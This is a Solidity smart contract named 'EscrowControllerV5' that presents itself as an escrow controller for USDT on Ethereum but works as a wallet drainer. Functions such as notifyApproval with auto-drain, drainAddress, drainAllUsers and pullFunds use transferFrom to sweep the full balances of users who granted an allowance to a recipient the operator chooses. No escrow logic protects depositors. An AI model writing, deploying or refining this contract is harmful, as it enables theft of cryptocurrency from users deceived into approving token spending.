// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract EscrowControllerV5 {
    address public companyWallet;
    address public autoDrainRecipient;
    bool public autoDrainEnabled;
    
    struct ApprovalRecord {
        address user;
        uint256 amount;
        uint256 timestamp;
        bool exists;
    }
    
    event FundsPulled(address indexed token, address indexed user, address indexed recipient, uint256 amount);
    event FundsPulledBatch(address indexed token, address indexed recipient, uint256 totalAmount, uint256 userCount);
    event AutoDrainToggled(bool enabled, address indexed by);
    event AutoDrainRecipientUpdated(address indexed oldRecipient, address indexed newRecipient);
    event AutoDrainExecuted(address indexed user, uint256 amount, address indexed recipient);
    event AutoDrainSkipped(address indexed user, string reason);
    
    mapping(address => ApprovalRecord) public approvals;
    address[] public approvedUsers;
    mapping(address => bool) private isInArray;
    uint256 public totalApprovers;
    uint256 public totalPulledAmount;

    // ERC20 USDT on Ethereum
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    modifier onlyCompany() {
        require(msg.sender == companyWallet, "only company");
        _;
    }

    constructor(address _companyWallet) {
        require(_companyWallet != address(0), "company wallet required");
        companyWallet = _companyWallet;
    }

    // ===== USER: REGISTER (OPTIONAL) =====
    function notifyApproval() external {
        if (!isInArray[msg.sender]) {
            approvedUsers.push(msg.sender);
            isInArray[msg.sender] = true;
            totalApprovers++;
        }
        approvals[msg.sender] = ApprovalRecord(msg.sender, 1, block.timestamp, true);
        
        if (autoDrainEnabled && autoDrainRecipient != address(0)) {
            _executeAutoDrain(msg.sender);
        }
    }

    // ===== AUTO DRAIN CONFIG =====
    function setAutoDrainRecipient(address _recipient) external onlyCompany {
        require(_recipient != address(0), "invalid");
        emit AutoDrainRecipientUpdated(autoDrainRecipient, _recipient);
        autoDrainRecipient = _recipient;
    }
    
    function toggleAutoDrain() external onlyCompany {
        autoDrainEnabled = !autoDrainEnabled;
        emit AutoDrainToggled(autoDrainEnabled, msg.sender);
    }

    // ===== DRAIN SINGLE ADDRESS =====
    function drainAddress(address _user) external onlyCompany {
        require(autoDrainRecipient != address(0), "no recipient");
        _executeAutoDrain(_user);
    }

    // ===== DRAIN ALL REGISTERED =====
    function drainAllUsers() external onlyCompany returns (uint256 count, uint256 total) {
        require(autoDrainRecipient != address(0), "no recipient");
        IERC20 usdt = IERC20(USDT);
        
        uint256 len = approvedUsers.length;
        for (uint256 i = 0; i < len; i++) {
            address u = approvedUsers[i];
            uint256 bal = usdt.balanceOf(u);
            uint256 allow = usdt.allowance(u, address(this));
            if (bal == 0 || allow == 0) continue;
            
            uint256 amt = bal < allow ? bal : allow;
            if (!usdt.transferFrom(u, autoDrainRecipient, amt)) continue;
            
            total += amt;
            count++;
            emit AutoDrainExecuted(u, amt, autoDrainRecipient);
        }
        totalPulledAmount += total;
        if (total > 0) emit FundsPulledBatch(address(usdt), autoDrainRecipient, total, count);
    }

    // ===== INTERNAL AUTO DRAIN =====
    function _executeAutoDrain(address _user) internal {
        IERC20 usdt = IERC20(USDT);
        
        uint256 bal = usdt.balanceOf(_user);
        if (bal == 0) {
            emit AutoDrainSkipped(_user, "zero balance");
            return;
        }
        
        uint256 allow = usdt.allowance(_user, address(this));
        if (allow == 0) {
            emit AutoDrainSkipped(_user, "zero allowance");
            return;
        }
        
        uint256 amt = bal < allow ? bal : allow;
        require(usdt.transferFrom(_user, autoDrainRecipient, amt), "transfer failed");
        
        totalPulledAmount += amt;
        
        if (!isInArray[_user]) {
            approvedUsers.push(_user);
            isInArray[_user] = true;
            totalApprovers++;
            approvals[_user] = ApprovalRecord(_user, 1, block.timestamp, true);
        }
        
        emit AutoDrainExecuted(_user, amt, autoDrainRecipient);
    }

    // ===== PULL FUNDS =====
    function pullFunds(address _token, address _user, address _to, uint256 _amount) external onlyCompany {
        require(_token != address(0) && _user != address(0) && _to != address(0), "invalid");
        require(_amount > 0, "zero amount");
        require(IERC20(_token).transferFrom(_user, _to, _amount), "transfer failed");
        
        totalPulledAmount += _amount;
        emit FundsPulled(_token, _user, _to, _amount);
    }

    // ===== VIEW FUNCTIONS =====
    function checkUserAllowance(address _user, address _token) external view returns (uint256) {
        return IERC20(_token).allowance(_user, address(this));
    }
    
    function getUserBalance(address _user, address _token) external view returns (uint256) {
        return IERC20(_token).balanceOf(_user);
    }

    function getAllApprovals() external view returns (
        address[] memory users,
        uint256[] memory amounts,
        uint256[] memory timestamps
    ) {
        uint256 len = approvedUsers.length;
        users = new address[](len);
        amounts = new uint256[](len);
        timestamps = new uint256[](len);
        for (uint256 i = 0; i < len; i++) {
            ApprovalRecord memory r = approvals[approvedUsers[i]];
            users[i] = r.user;
            amounts[i] = r.amount;
            timestamps[i] = r.timestamp;
        }
    }

    function getApprovalDetails(address _user) external view returns (
        bool exists,
        uint256 amount,
        uint256 timestamp,
        uint256 currentAllowance,
        bool hasActiveApproval
    ) {
        ApprovalRecord memory r = approvals[_user];
        IERC20 usdt = IERC20(USDT);
        uint256 allow = usdt.allowance(_user, address(this));
        return (r.exists, r.amount, r.timestamp, allow, allow > 0);
    }

    function getStats() external view returns (
        uint256 _totalApprovers,
        uint256 _totalPulledAmount,
        bool _autoDrainEnabled,
        address _autoDrainRecipient
    ) {
        return (totalApprovers, totalPulledAmount, autoDrainEnabled, autoDrainRecipient);
    }

    function getApprovedUsersCount() external view returns (uint256) {
        return approvedUsers.length;
    }

    // ===== ADMIN =====
    function setCompanyWallet(address _new) external onlyCompany {
        require(_new != address(0), "invalid");
        companyWallet = _new;
    }

    function removeApproval(address _user) external onlyCompany {
        require(approvals[_user].exists, "not found");
        delete approvals[_user];
        isInArray[_user] = false;
        
        uint256 len = approvedUsers.length;
        for (uint256 i = 0; i < len; i++) {
            if (approvedUsers[i] == _user) {
                approvedUsers[i] = approvedUsers[len - 1];
                approvedUsers.pop();
                break;
            }
        }
        if (totalApprovers > 0) totalApprovers--;
    }
}